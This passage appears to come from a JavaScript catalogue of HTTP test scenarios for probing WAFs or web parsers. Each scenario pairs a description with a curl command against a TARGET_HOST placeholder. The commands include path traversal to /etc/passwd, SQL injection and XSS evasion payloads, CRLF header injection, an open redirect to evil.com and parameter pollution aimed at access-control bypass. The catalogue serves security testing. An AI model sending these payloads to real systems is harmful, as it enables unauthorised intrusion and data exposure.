                            curl: 'curl "http://TARGET_HOST/" $(for i in {1..100}; do echo -H "X-Custom-$i: value$i"; done) -v'
                        },
                        {
                            id: 'HEADER-030-B',
                            name: 'Oversized Single Header',
                            description: 'Single header with extremely large value',
                            curl: 'curl "http://TARGET_HOST/" -H "X-Large: $(printf \'A%.0s\' {1..16384})" -v'
                        },
                        {
                            id: 'HEADER-030-C',
                            name: 'Multiple Large Headers',
                            description: 'Multiple headers with large values',
                            curl: 'curl "http://TARGET_HOST/" -H "X-Large1: $(printf \'A%.0s\' {1..4096})" -H "X-Large2: $(printf \'B%.0s\' {1..4096})" -H "X-Large3: $(printf \'C%.0s\' {1..4096})" -v'
                        }
                    ]
                }
            ],
           'URI and Parameters': [
                {
                    id: 'URI-001',
                    name: 'Allow Unicode Parse Failure in Path Parameter',
                    severity: 'high',
                    description: 'Tests Unicode parsing failures in URL path parameters',
                    scenarios: [
                        {
                            id: 'URI-001-A',
                            name: 'Unicode in Path',
                            description: 'Invalid Unicode in path segment',
                            curl: 'curl "http://TARGET_HOST/%ED%A0%80/test" -v'
                        },
                        {
                            id: 'URI-001-B',
                            name: 'Unicode in Filename',
                            description: 'Invalid Unicode in filename',
                            curl: 'curl "http://TARGET_HOST/files/test%ED%A0%80.pdf" -v'
                        },
                        {
                            id: 'URI-001-C',
                            name: 'Multiple Unicode Errors',
                            description: 'Multiple Unicode errors in path',
                            curl: 'curl "http://TARGET_HOST/%ED%A0%80/%ED%B0%80" -v'
                        }
                    ]
                },
                {
                    id: 'URI-002',
                    name: 'Allow Path Parameter without Value',
                    severity: 'low',
                    description: 'Tests path parameters without values',
                    scenarios: [
                        {
                            id: 'URI-002-A',
                            name: 'Matrix Parameter No Value',
                            description: 'Matrix parameter without value',
                            curl: 'curl "http://TARGET_HOST/path;param;test/file" -v'
                        },
                        {
                            id: 'URI-002-B',
                            name: 'Multiple Empty Params',
                            description: 'Multiple parameters without values',
                            curl: 'curl "http://TARGET_HOST/path;a;b;c/test" -v'
                        },
                        {
                            id: 'URI-002-C',
                            name: 'Mixed Parameters',
                            description: 'Mix of valued and non-valued params',
                            curl: 'curl "http://TARGET_HOST/path;id=123;flag;type=user/data" -v'
                        }
                    ]
                },
                {
                    id: 'PARAM-001',
                    name: 'Allow Empty Parameter Name',
                    severity: 'medium',
                    description: 'Tests URL parameters without names',
                    scenarios: [
                        {
                            id: 'PARAM-001-A',
                            name: 'Empty Param Name',
                            description: 'Parameter with empty name',
                            curl: 'curl "http://TARGET_HOST/?=value&test=data" -v'
                        },
                        {
                            id: 'PARAM-001-B',
                            name: 'Multiple Empty Names',
                            description: 'Multiple empty parameter names',
                            curl: 'curl "http://TARGET_HOST/?=val1&=val2&=val3" -v'
                        },
                        {
                            id: 'PARAM-001-C',
                            name: 'Mixed Empty and Named',
                            description: 'Mix of empty and named parameters',
                            curl: 'curl "http://TARGET_HOST/?user=admin&=secret&role=user" -v'
                        }
                    ]
                },
                {
                    id: 'PARAM-002',
                    name: 'Allow Low ASCII in Parameter Name',
                    severity: 'medium',
                    description: 'Tests parameter names with control characters',
                    scenarios: [
                        {
                            id: 'PARAM-002-A',
                            name: 'Control in Param Name',
                            description: 'Control character in parameter name',
                            curl: 'curl "http://TARGET_HOST/?param%01=value" -v'
                        },
                        {
                            id: 'PARAM-002-B',
                            name: 'Tab in Param Name',
                            description: 'Tab character in parameter name',
                            curl: 'curl "http://TARGET_HOST/?param%09name=value" -v'
                        },
                        {
                            id: 'PARAM-002-C',
                            name: 'Multiple Control Chars',
                            description: 'Multiple control characters in param',
                            curl: 'curl "http://TARGET_HOST/?%01%02%03=value" -v'
                        }
                    ]
                },
                {
                    id: 'PARAM-003',
                    name: 'Allow High ASCII in Parameter Name',
                    severity: 'medium',
                    description: 'Tests parameter names with high ASCII characters',
                    scenarios: [
                        {
                            id: 'PARAM-003-A',
                            name: 'Extended ASCII Param',
                            description: 'Extended ASCII in parameter name',
                            curl: 'curl "http://TARGET_HOST/?param%80=value" -v'
                        },
                        {
                            id: 'PARAM-003-B',
                            name: 'Latin-1 in Param',
                            description: 'Latin-1 characters in parameter',
                            curl: 'curl "http://TARGET_HOST/?par%E1m=value" -v'
                        },
                        {
                            id: 'PARAM-003-C',
                            name: 'High ASCII Mix',
                            description: 'Various high ASCII in parameter',
                            curl: 'curl "http://TARGET_HOST/?%FF%FE%FD=value" -v'
                        }
                    ]
                },
                {
                    id: 'PARAM-004',
                    name: 'Allow UTF8 Parse Failure in Parameter Name',
                    severity: 'high',
                    description: 'Tests UTF8 parsing errors in URL parameter names',
                    scenarios: [
                        {
                            id: 'PARAM-004-A',
                            name: 'UTF8 Error in Name',
                            description: 'Invalid UTF8 in parameter name',
                            curl: 'curl "http://TARGET_HOST/?param%C3%28=value" -v'
                        },
                        {
                            id: 'PARAM-004-B',
                            name: 'Incomplete UTF8',
                            description: 'Incomplete UTF8 sequence',
                            curl: 'curl "http://TARGET_HOST/?%C3param=value" -v'
                        },
                        {
                            id: 'PARAM-004-C',
                            name: 'Multiple UTF8 Errors',
                            description: 'Multiple UTF8 errors in name',
                            curl: 'curl "http://TARGET_HOST/?%C3%28p%C3%29=value" -v'
                        }
                    ]
                },
                {
                    id: 'PARAM-005',
                    name: 'Allow Unicode Parse Failure in Parameter Name',
                    severity: 'high',
                    description: 'Tests Unicode parsing failures in URL parameter names',
                    scenarios: [
                        {
                            id: 'PARAM-005-A',
                            name: 'Unicode Error in Name',
                            description: 'Invalid Unicode in parameter name',
                            curl: 'curl "http://TARGET_HOST/?param%ED%A0%80=value" -v'
                        },
                        {
                            id: 'PARAM-005-B',
                            name: 'Surrogate in Name',
                            description: 'Invalid surrogate in parameter',
                            curl: 'curl "http://TARGET_HOST/?%ED%A0%80test=value" -v'
                        },
                        {
                            id: 'PARAM-005-C',
                            name: 'Mixed Unicode Errors',
                            description: 'Multiple Unicode errors',
                            curl: 'curl "http://TARGET_HOST/?%ED%A0%80%ED%B0%80=value" -v'
                        }
                    ]
                },
                {
                    id: 'PARAM-006',
                    name: 'Allow Low ASCII in Parameter Value',
                    severity: 'medium',
                    description: 'Tests parameter values with control characters',
                    scenarios: [
                        {
                            id: 'PARAM-006-A',
                            name: 'Control in Value',
                            description: 'Control character in parameter value',
                            curl: 'curl "http://TARGET_HOST/?param=val%01ue" -v'
                        },
                        {
                            id: 'PARAM-006-B',
                            name: 'Newline in Value',
                            description: 'Newline in parameter value',
                            curl: 'curl "http://TARGET_HOST/?param=line1%0Aline2" -v'
                        },
                        {
                            id: 'PARAM-006-C',
                            name: 'Null in Value',
                            description: 'Null byte in parameter value',
                            curl: 'curl "http://TARGET_HOST/?param=before%00after" -v'
                        }
                    ]
                },
                {
                    id: 'PARAM-007',
                    name: 'Allow High ASCII in Parameter Value',
                    severity: 'medium',
                    description: 'Tests parameter values with high ASCII characters',
                    scenarios: [
                        {
                            id: 'PARAM-007-A',
                            name: 'Extended ASCII Value',
                            description: 'Extended ASCII in parameter value',
                            curl: 'curl "http://TARGET_HOST/?param=val%80ue" -v'
                        },
                        {
                            id: 'PARAM-007-B',
                            name: 'UTF-8 in Value',
                            description: 'UTF-8 sequences in value',
                            curl: 'curl "http://TARGET_HOST/?param=%C2%A92024" -v'
                        },
                        {
                            id: 'PARAM-007-C',
                            name: 'High ASCII Mix',
                            description: 'Various high ASCII in value',
                            curl: 'curl "http://TARGET_HOST/?param=%FF%FE%FD" -v'
                        }
                    ]
                },
                {
                    id: 'PARAM-008',
                    name: 'Allow UTF8 Parse Failure in Parameter Value',
                    severity: 'high',
                    description: 'Tests UTF8 parsing errors in URL parameter values',
                    scenarios: [
                        {
                            id: 'PARAM-008-A',
                            name: 'UTF8 Error in Value',
                            description: 'Invalid UTF8 in parameter value',
                            curl: 'curl "http://TARGET_HOST/?param=value%C3%28" -v'
                        },
                        {
                            id: 'PARAM-008-B',
                            name: 'Incomplete UTF8 Value',
                            description: 'Incomplete UTF8 sequence in value',
                            curl: 'curl "http://TARGET_HOST/?param=%C3value" -v'
                        },
                        {
                            id: 'PARAM-008-C',
                            name: 'Multiple UTF8 in Value',
                            description: 'Multiple UTF8 errors in value',
                            curl: 'curl "http://TARGET_HOST/?param=%C3%28val%C3%29" -v'
                        }
                    ]
                },
                {
                    id: 'PARAM-009',
                    name: 'Allow Unicode Parse Failure in Parameter Value',
                    severity: 'high',
                    description: 'Tests Unicode parsing failures in URL parameter values',
                    scenarios: [
                        {
                            id: 'PARAM-009-A',
                            name: 'Unicode Error in Value',
                            description: 'Invalid Unicode in parameter value',
                            curl: 'curl "http://TARGET_HOST/?param=value%ED%A0%80" -v'
                        },
                        {
                            id: 'PARAM-009-B',
                            name: 'Surrogate in Value',
                            description: 'Invalid surrogate in value',
                            curl: 'curl "http://TARGET_HOST/?param=%ED%A0%80test" -v'
                        },
                        {
                            id: 'PARAM-009-C',
                            name: 'Mixed Unicode in Value',
                            description: 'Multiple Unicode errors in value',
                            curl: 'curl "http://TARGET_HOST/?param=%ED%A0%80%ED%B0%80" -v'
                        }
                    ]
                },
                {
                    id: 'PARAM-010',
                    name: 'Allow Multiple Parameters with Same Name',
                    severity: 'high',
                    description: 'Tests multiple parameters with same name',
                    scenarios: [
                        {
                            id: 'PARAM-010-A',
                            name: 'Duplicate Parameters',
                            description: 'Same parameter multiple times',
                            curl: 'curl "http://TARGET_HOST/?user=guest&user=admin" -v'
                        },
                        {
                            id: 'PARAM-010-B',
                            name: 'Triple Parameters',
                            description: 'Parameter repeated three times',
                            curl: 'curl "http://TARGET_HOST/?role=user&role=admin&role=root" -v'
                        },
                        {
                            id: 'PARAM-010-C',
                            name: 'Array Notation',
                            description: 'Array notation with duplicates',
                            curl: 'curl "http://TARGET_HOST/?id[]=1&id[]=2&id[]=999" -v'
                        }
                    ]
                },
                {
                    id: 'PARAM-011',
                    name: 'Allow Parameter without Equal Sign',
                    severity: 'low',
                    description: 'Tests parameters without equal sign assignment',
                    scenarios: [
                        {
                            id: 'PARAM-011-A',
                            name: 'Flag Parameter',
                            description: 'Parameter without value',
                            curl: 'curl "http://TARGET_HOST/?flag&test=value" -v'
                        },
                        {
                            id: 'PARAM-011-B',
                            name: 'Multiple Flags',
                            description: 'Multiple parameters without values',
                            curl: 'curl "http://TARGET_HOST/?debug&verbose&trace" -v'
                        },
                        {
                            id: 'PARAM-011-C',
                            name: 'Mixed Parameters',
                            description: 'Mix of valued and flag parameters',
                            curl: 'curl "http://TARGET_HOST/?user=admin&debug&role=root&verbose" -v'
                        }
                    ]
                },
                {
                    id: 'URI-003',
                    name: 'Path Traversal Techniques',
                    severity: 'critical',
                    description: 'Tests various path traversal techniques',
                    scenarios: [
                        {
                            id: 'URI-003-A',
                            name: 'Basic Path Traversal',
                            description: 'Simple path traversal attempt',
                            curl: 'curl "http://TARGET_HOST/app/../../etc/passwd" -v'
                        },
                        {
                            id: 'URI-003-B',
                            name: 'Encoded Path Traversal',
                            description: 'URL-encoded path traversal',
                            curl: 'curl "http://TARGET_HOST/app/%2e%2e/%2e%2e/etc/passwd" -v'
                        },
                        {
                            id: 'URI-003-C',
                            name: 'Double-Encoded Traversal',
                            description: 'Double-encoded path traversal',
                            curl: 'curl "http://TARGET_HOST/app/%252e%252e/%252e%252e/etc/passwd" -v'
                        }
                    ]
                },
                {
                    id: 'URI-004',
                    name: 'URL Encoding Techniques',
                    severity: 'high',
                    description: 'Tests various URL encoding techniques',
                    scenarios: [
                        {
                            id: 'URI-004-A',
                            name: 'Mixed Case Encoding',
                            description: 'Mixed case in URL encoding',
                            curl: 'curl "http://TARGET_HOST/test%2fpath%2Ffile" -v'
                        },
                        {
                            id: 'URI-004-B',
                            name: 'Overlong Encoding',
                            description: 'Overlong URL encoding',
                            curl: 'curl "http://TARGET_HOST/%25%33%31" -v'
                        },
                        {
                            id: 'URI-004-C',
                            name: 'UTF-8 Encoding',
                            description: 'UTF-8 encoding of special chars',
                            curl: 'curl "http://TARGET_HOST/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd" -v'
                        }
                    ]
                },
                {
                    id: 'URI-005',
                    name: 'URL Fragment Manipulation',
                    severity: 'medium',
                    description: 'Tests manipulation of URL fragments',
                    scenarios: [
                        {
                            id: 'URI-005-A',
                            name: 'Fragment Injection',
                            description: 'Injection in URL fragment',
                            curl: 'curl "http://TARGET_HOST/page#<script>alert(1)< /script>" -v'
                        },
                        {
                            id: 'URI-005-B',
                            name: 'Fragment Parameter',
                            description: 'Parameters in URL fragment',
                            curl: 'curl "http://TARGET_HOST/page#page=admin&user=root" -v'
                        },
                        {
                            id: 'URI-005-C',
                            name: 'XSS via Fragment',
                            description: 'XSS payload in fragment',
                            curl: 'curl "http://TARGET_HOST/page#javascript:alert(document.domain)" -v'
                        }
                    ]
                },
                {
                    id: 'URI-006',
                    name: 'Multiple Forward Slashes',
                    severity: 'medium',
                    description: 'Tests URLs with multiple consecutive forward slashes',
                    scenarios: [
                        {
                            id: 'URI-006-A',
                            name: 'Double Slash Path',
                            description: 'Double slashes in path',
                            curl: 'curl "http://TARGET_HOST//path//to//file" -v'
                        },
                        {
                            id: 'URI-006-B',
                            name: 'Triple Slash Path',
                            description: 'Triple slashes in path',
                            curl: 'curl "http://TARGET_HOST///path///to///file" -v'
                        },
                        {
                            id: 'URI-006-C',
                            name: 'Multiple Scheme Slashes',
                            description: 'Multiple slashes after scheme',
                            curl: 'curl "http://////TARGET_HOST/path" -v'
                        }
                    ]
                },
                {
                    id: 'URI-007',
                    name: 'Backslash in URL',
                    severity: 'medium',
                    description: 'Tests URLs with backslashes instead of forward slashes',
                    scenarios: [
                        {
                            id: 'URI-007-A',
                            name: 'Backslash Path',
                            description: 'Backslashes in path',
                            curl: 'curl "http://TARGET_HOST/path\\to\\file" -v'
                        },
                        {
                            id: 'URI-007-B',
                            name: 'Mixed Slashes',
                            description: 'Mix of forward and backslashes',
                            curl: 'curl "http://TARGET_HOST/path/to\\file/name" -v'
                        },
                        {
                            id: 'URI-007-C',
                            name: 'Encoded Backslash',
                            description: 'URL-encoded backslashes',
                            curl: 'curl "http://TARGET_HOST/path%5Cto%5Cfile" -v'
                        }
                    ]
                },
                {
                    id: 'URI-008',
                    name: 'URI Length Exploitation',
                    severity: 'medium',
                    description: 'Tests extremely long URLs and parameters',
                    scenarios: [
                        {
                            id: 'URI-008-A',
                            name: 'Long Path',
                            description: 'Extremely long URL path',
                            curl: 'curl "http://TARGET_HOST/$(printf \'a%.0s\' {1..4096})" -v'
                        },
                        {
                            id: 'URI-008-B',
                            name: 'Long Parameter Value',
                            description: 'Extremely long parameter value',
                            curl: 'curl "http://TARGET_HOST/?param=$(printf \'a%.0s\' {1..8192})" -v'
                        },
                        {
                            id: 'URI-008-C',
                            name: 'Many Parameters',
                            description: 'URL with many parameters',
                            curl: 'curl "http://TARGET_HOST/$(for i in {1..1000}; do echo -n "&param$i=value$i"; done)" -v'
                        }
                    ]
                },
                {
                    id: 'PARAM-012',
                    name: 'Parameter Pollution Techniques',
                    severity: 'high',
                    description: 'Tests various parameter pollution techniques',
                    scenarios: [
                        {
                            id: 'PARAM-012-A',
                            name: 'HPP Basic',
                            description: 'Basic HTTP parameter pollution',
                            curl: 'curl "http://TARGET_HOST/?param=normal&param=attack" -v'
                        },
                        {
                            id: 'PARAM-012-B',
                            name: 'HPP Different Delimiters',
                            description: 'Parameter pollution across delimiters',
                            curl: 'curl "http://TARGET_HOST/?param=normal&param=attack;param=other" -v'
                        },
                        {
                            id: 'PARAM-012-C',
                            name: 'Cross-Delimiter Pollution',
                            description: 'Mixing parameter styles',
                            curl: 'curl "http://TARGET_HOST/path;param=matrix?param=query" -v'
                        }
                    ]
                },
                {
                    id: 'PARAM-013',
                    name: 'Parameter Separator Confusion',
                    severity: 'high',
                    description: 'Tests alternative parameter separators',
                    scenarios: [
                        {
                            id: 'PARAM-013-A',
                            name: 'Semicolon Separator',
                            description: 'Using semicolon as separator',
                            curl: 'curl "http://TARGET_HOST/?param1=value1;param2=value2" -v'
                        },
                        {
                            id: 'PARAM-013-B',
                            name: 'Comma Separator',
                            description: 'Using comma as separator',
                            curl: 'curl "http://TARGET_HOST/?param1=value1,param2=value2" -v'
                        },
                        {
                            id: 'PARAM-013-C',
                            name: 'Mixed Separators',
                            description: 'Mix of separators in URL',
                            curl: 'curl "http://TARGET_HOST/?param1=value1&param2=value2;param3=value3,param4=value4" -v'
                        }
                    ]
                },
                {
                    id: 'PARAM-014',
                    name: 'Parameter-Based Access Control Bypass',
                    severity: 'critical',
                    description: 'Tests access control bypass via parameter manipulation',
                    scenarios: [
                        {
                            id: 'PARAM-014-A',
                            name: 'Parameter Override',
                            description: 'Overriding security parameters',
                            curl: 'curl "http://TARGET_HOST/profile?user=victim&admin=true&role=superuser" -v'
                        },
                        {
                            id: 'PARAM-014-B',
                            name: 'Case Sensitivity Bypass',
                            description: 'Case variations in parameters',
                            curl: 'curl "http://TARGET_HOST/page?User=admin&user=victim" -v'
                        },
                        {
                            id: 'PARAM-014-C',
                            name: 'Parameter Shadowing',
                            description: 'Shadowing sensitive parameters',
                            curl: 'curl "http://TARGET_HOST/login?username=admin&username=victim&password=victim_pass" -v'
                        }
                    ]
                },
                {
                    id: 'PARAM-015',
                    name: 'JSON in URL Parameters',
                    severity: 'high',
                    description: 'Tests JSON structures in URL parameters',
                    scenarios: [
                        {
                            id: 'PARAM-015-A',
                            name: 'Basic JSON Parameter',
                            description: 'Simple JSON in URL parameter',
                            curl: 'curl "http://TARGET_HOST/?data={%22user%22:%22admin%22,%22role%22:%22superuser%22}" -v'
                        },
                        {
                            id: 'PARAM-015-B',
                            name: 'Nested JSON',
                            description: 'Nested JSON in URL parameter',
                            curl: 'curl "http://TARGET_HOST/?config={%22user%22:{%22id%22:1,%22admin%22:true}}" -v'
                        },
                        {
                            id: 'PARAM-015-C',
                            name: 'JSON Array',
                            description: 'JSON array in URL parameter',
                            curl: 'curl "http://TARGET_HOST/?roles=[%22user%22,%22admin%22,%22root%22]" -v'
                        }
                    ]
                },
                {
                    id: 'PARAM-016',
                    name: 'Parameter Type Confusion',
                    severity: 'high',
                    description: 'Tests parameter type confusion issues',
                    scenarios: [
                        {
                            id: 'PARAM-016-A',
                            name: 'Array vs String',
                            description: 'Array vs string parameter confusion',
                            curl: 'curl "http://TARGET_HOST/?param=value&param[]=array_value" -v'
                        },
                        {
                            id: 'PARAM-016-B',
                            name: 'Object vs String',
                            description: 'Object vs string parameter confusion',
                            curl: 'curl "http://TARGET_HOST/?param=value&param[key]=object_value" -v'
                        },
                        {
                            id: 'PARAM-016-C',
                            name: 'Mixed Notations',
                            description: 'Mix of parameter notations',
                            curl: 'curl "http://TARGET_HOST/?param=value&param.key=dot_notation&param[key]=bracket_notation" -v'
                        }
                    ]
                },
                {
                    id: 'PARAM-017',
                    name: 'Parameter-Based SQLi Evasion',
                    severity: 'critical',
                    description: 'Tests SQL injection evasion via parameter manipulation',
                    scenarios: [
                        {
                            id: 'PARAM-017-A',
                            name: 'Comment-Based Evasion',
                            description: 'SQL injection with comment-based evasion',
                            curl: 'curl "http://TARGET_HOST/?id=1%27+or+%271%27%3D%271%27--" -v'
                        },
                        {
                            id: 'PARAM-017-B',
                            name: 'Split Injection',
                            description: 'Split SQL injection across parameters',
                            curl: 'curl "http://TARGET_HOST/?id=1%27&condition=or+1%3D1--" -v'
                        },
                        {
                            id: 'PARAM-017-C',
                            name: 'Encoded Injection',
                            description: 'Encoded SQL injection payload',
                            curl: 'curl "http://TARGET_HOST/?id=%31%27%20%6F%72%20%27%31%27%3D%27%31" -v'
                        }
                    ]
                },
                {
                    id: 'PARAM-018',
                    name: 'Parameter-Based Cache Poisoning',
                    severity: 'high',
                    description: 'Tests cache poisoning via parameter manipulation',
                    scenarios: [
                        {
                            id: 'PARAM-018-A',
                            name: 'Unkeyed Parameter',
                            description: 'Cache poisoning with unkeyed parameter',
                            curl: 'curl "http://TARGET_HOST/page?param=normal&cache_buster=<script>alert(1)< /script>" -v'
                        },
                        {
                            id: 'PARAM-018-B',
                            name: 'Parameter Cloaking',
                            description: 'Cache poisoning with parameter cloaking',
                            curl: 'curl "http://TARGET_HOST/page?param=normal%0d%0aContent-Length:%200%0d%0a%0d%0a<script>alert(1)< /script>" -v'
                        },
                        {
                            id: 'PARAM-018-C',
                            name: 'Method Override',
                            description: 'Cache poisoning with method override',
                            curl: 'curl "http://TARGET_HOST/page?param=normal&_method=POST" -v'
                        }
                    ]
                },
                {
                    id: 'URI-009',
                    name: 'URI Scheme Manipulation',
                    severity: 'high',
                    description: 'Tests URI scheme manipulation',
                    scenarios: [
                        {
                            id: 'URI-009-A',
                            name: 'Alternative Schemes',
                            description: 'Using alternative URI schemes',
                            curl: 'curl "https://TARGET_HOST/redirect?url=javascript:alert(1)" -v'
                        },
                        {
                            id: 'URI-009-B',
                            name: 'Data URI Scheme',
                            description: 'Using data URI scheme',
                            curl: 'curl "http://TARGET_HOST/redirect?url=data:text/html,<script>alert(1)< /script>" -v'
                        },
                        {
                            id: 'URI-009-C',
                            name: 'Custom URI Scheme',
                            description: 'Using custom URI scheme',
                            curl: 'curl "http://TARGET_HOST/redirect?url=custom-scheme://payload" -v'
                        }
                    ]
                },
                {
                    id: 'URI-010',
                    name: 'Path Parameter-Based Attacks',
                    severity: 'high',
                    description: 'Tests attacks using path parameters',
                    scenarios: [
                        {
                            id: 'URI-010-A',
                            name: 'Path Parameter Injection',
                            description: 'Injection via path parameter',
                            curl: 'curl "http://TARGET_HOST/user;id=1+or+1=1/profile" -v'
                        },
                        {
                            id: 'URI-010-B',
                            name: 'Path Parameter XSS',
                            description: 'XSS via path parameter',
                            curl: 'curl "http://TARGET_HOST/user;name=<script>alert(1)< /script>/profile" -v'
                        },
                        {
                            id: 'URI-010-C',
                            name: 'Path Parameter Pollution',
                            description: 'Multiple path parameters with same name',
                            curl: 'curl "http://TARGET_HOST/user;role=user;role=admin/profile" -v'
                        }
                    ]
                },
                {
                    id: 'URI-011',
                    name: 'Dot Segments Manipulation',
                    severity: 'high',
                    description: 'Tests manipulation of dot segments in URLs',
                    scenarios: [
                        {
                            id: 'URI-011-A',
                            name: 'Current Directory',
                            description: 'Using current directory notation',
                            curl: 'curl "http://TARGET_HOST/./admin/./config" -v'
                        },
                        {
                            id: 'URI-011-B',
                            name: 'Parent Directory',
                            description: 'Using parent directory notation',
                            curl: 'curl "http://TARGET_HOST/public/../admin/config" -v'
                        },
                        {
                            id: 'URI-011-C',
                            name: 'Complex Dot Segments',
                            description: 'Complex combination of dot segments',
                            curl: 'curl "http://TARGET_HOST/./public/../../admin/./config" -v'
                        }
                    ]
                },
                {
                    id: 'PARAM-019',
                    name: 'Object Property Injection',
                    severity: 'high',
                    description: 'Tests object property injection via parameters',
                    scenarios: [
                        {
                            id: 'PARAM-019-A',
                            name: 'Dot Notation',
                            description: 'Object property access via dot notation',
                            curl: 'curl "http://TARGET_HOST/?user.role=admin&user.id=1" -v'
                        },
                        {
                            id: 'PARAM-019-B',
                            name: 'Bracket Notation',
                            description: 'Object property access via bracket notation',
                            curl: 'curl "http://TARGET_HOST/?user[role]=admin&user[id]=1" -v'
                        },
                        {
                            id: 'PARAM-019-C',
                            name: 'Nested Properties',
                            description: 'Deeply nested object properties',
                            curl: 'curl "http://TARGET_HOST/?user[profile][permissions][admin]=true" -v'
                        }
                    ]
                },
                {
                    id: 'PARAM-020',
                    name: 'Parameter-Based XSS Evasion',
                    severity: 'critical',
                    description: 'Tests XSS evasion techniques via parameters',
                    scenarios: [
                        {
                            id: 'PARAM-020-A',
                            name: 'Encoded XSS',
                            description: 'URL-encoded XSS payload',
                            curl: 'curl "http://TARGET_HOST/?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E" -v'
                        },
                        {
                            id: 'PARAM-020-B',
                            name: 'Split XSS',
                            description: 'XSS payload split across parameters',
                            curl: 'curl "http://TARGET_HOST/?param1=<img&param2=src=x&param3=onerror=alert(1)>" -v'
                        },
                        {
                            id: 'PARAM-020-C',
                            name: 'Alternative Encodings',
                            description: 'XSS with alternative encoding',
                            curl: 'curl "http://TARGET_HOST/?q=%26%23x3C%3B%26%23x73%3B%26%23x63%3B%26%23x72%3B%26%23x69%3B%26%23x70%3B%26%23x74%3B%26%23x3E%3B%26%23x61%3B%26%23x6C%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B%26%23x3C%3B%26%23x2F%3B%26%23x73%3B%26%23x63%3B%26%23x72%3B%26%23x69%3B%26%23x70%3B%26%23x74%3B%26%23x3E%3B" -v'
                        }
                    ]
                },
                {
                    id: 'URI-012',
                    name: 'URL Normalization Bypass',
                    severity: 'high',
                    description: 'Tests URL normalization bypass techniques',
                    scenarios: [
                        {
                            id: 'URI-012-A',
                            name: 'Case Sensitivity',
                            description: 'Exploiting case sensitivity',
                            curl: 'curl "http://TARGET_HOST/AdMin/ConFig" -v'
                        },
                        {
                            id: 'URI-012-B',
                            name: 'Character Encoding',
                            description: 'Non-standard character encoding',
                            curl: 'curl "http://TARGET_HOST/%61%64%6d%69%6e/%63%6f%6e%66%69%67" -v'
                        },
                        {
                            id: 'URI-012-C',
                            name: 'Alternate Representation',
                            description: 'Alternate character representation',
                            curl: 'curl "http://TARGET_HOST/admin%09/config" -v'
                        }
                    ]
                },
                {
                    id: 'URI-013',
                    name: 'Relative URL Manipulation',
                    severity: 'medium',
                    description: 'Tests manipulation of relative URLs',
                    scenarios: [
                        {
                            id: 'URI-013-A',
                            name: 'Relative Path',
                            description: 'Using relative path notation',
                            curl: 'curl "http://TARGET_HOST/public/goto?url=../admin/config" -v'
                        },
                        {
                            id: 'URI-013-B',
                            name: 'Protocol-Relative URL',
                            description: 'Using protocol-relative URL',
                            curl: 'curl "http://TARGET_HOST/redirect?url=//evil.com/script.js" -v'
                        },
                        {
                            id: 'URI-013-C',
                            name: 'Root-Relative Path',
                            description: 'Using root-relative path',
                            curl: 'curl "http://TARGET_HOST/public/goto?url=/admin/config" -v'
                        }
                    ]
                },
                {
                    id: 'PARAM-021',
                    name: 'Parameter Name Case Sensitivity',
                    severity: 'medium',
                    description: 'Tests parameter name case sensitivity',
                    scenarios: [
                        {
                            id: 'PARAM-021-A',
                            name: 'Case Variation',
                            description: 'Case variations of same parameter',
                            curl: 'curl "http://TARGET_HOST/?UsEr=admin&user=guest" -v'
                        },
                        {
                            id: 'PARAM-021-B',
                            name: 'All Uppercase',
                            description: 'All uppercase parameter names',
                            curl: 'curl "http://TARGET_HOST/?USER=admin&ROLE=admin" -v'
                        },
                        {
                            id: 'PARAM-021-C',
                            name: 'Mixed Case',
                            description: 'Mix of case styles in parameters',
                            curl: 'curl "http://TARGET_HOST/?user=admin&Role=admin&AUTH_TOKEN=123" -v'
                        }
                    ]
                },
                {
                    id: 'PARAM-022',
                    name: 'Parameter Order Manipulation',
                    severity: 'medium',
                    description: 'Tests manipulation of parameter order',
                    scenarios: [
                        {
                            id: 'PARAM-022-A',
                            name: 'Reversed Order',
                            description: 'Parameters in reverse order',
                            curl: 'curl "http://TARGET_HOST/?role=admin&user=admin" -v'
                        },
                        {
                            id: 'PARAM-022-B',
                            name: 'Duplicate with Order',
                            description: 'Duplicate parameters in different orders',
                            curl: 'curl "http://TARGET_HOST/?user=guest&role=user&user=admin" -v'
                        },
                        {
                            id: 'PARAM-022-C',
                            name: 'Scrambled Order',
                            description: 'Parameters in unusual order',
                            curl: 'curl "http://TARGET_HOST/?token=123&user=admin&action=delete&confirm=yes" -v'
                        }
                    ]
                },
                {
                    id: 'URI-014',
                    name: 'Trailing Slash Handling',
                    severity: 'medium',
                    description: 'Tests handling of trailing slashes in URLs',
                    scenarios: [
                        {
                            id: 'URI-014-A',
                            name: 'With Trailing Slash',
                            description: 'URL with trailing slash',
                            curl: 'curl "http://TARGET_HOST/admin/" -v'
                        },
                        {
                            id: 'URI-014-B',
                            name: 'Without Trailing Slash',
                            description: 'URL without trailing slash',
                            curl: 'curl "http://TARGET_HOST/admin" -v'
                        },
                        {
                            id: 'URI-014-C',
                            name: 'Multiple Trailing Slashes',
                            description: 'URL with multiple trailing slashes',
                            curl: 'curl "http://TARGET_HOST/admin///" -v'
                        }
                    ]
                },
                {
                    id: 'URI-015',
                    name: 'URL Rewriting Bypass',
                    severity: 'high',
                    description: 'Tests bypassing URL rewriting rules',
                    scenarios: [
                        {
                            id: 'URI-015-A',
                            name: 'Extension Bypass',
                            description: 'Bypassing extension restrictions',
                            curl: 'curl "http://TARGET_HOST/admin.php.jpg" -v'
                        },
                        {
                            id: 'URI-015-B',
                            name: 'Path Bypass',
                            description: 'Bypassing path restrictions',
                            curl: 'curl "http://TARGET_HOST/images/../admin/config" -v'
                        },
                        {
                            id: 'URI-015-C',
                            name: 'Regex Bypass',
                            description: 'Bypassing regex pattern matching',
                            curl: 'curl "http://TARGET_HOST/adm.in/conf.ig" -v'
                        }
                    ]
                },
                {
                    id: 'PARAM-023',
                    name: 'Parameter Value Overflow',
                    severity: 'high',
                    description: 'Tests parameter value overflow vulnerabilities',
                    scenarios: [
                        {
                            id: 'PARAM-023-A',
                            name: 'Integer Overflow',
                            description: 'Integer overflow in parameter',
                            curl: 'curl "http://TARGET_HOST/?id=9223372036854775808" -v'
                        },
                        {
                            id: 'PARAM-023-B',
                            name: 'Negative Value',
                            description: 'Negative values in parameters',
                            curl: 'curl "http://TARGET_HOST/?count=-1&offset=-100" -v'
                        },
                        {
                            id: 'PARAM-023-C',
                            name: 'Scientific Notation',
                            description: 'Scientific notation in parameters',
                            curl: 'curl "http://TARGET_HOST/?value=1e10&multiplier=1e-10" -v'
                        }
                    ]
                },
                {
                    id: 'PARAM-024',
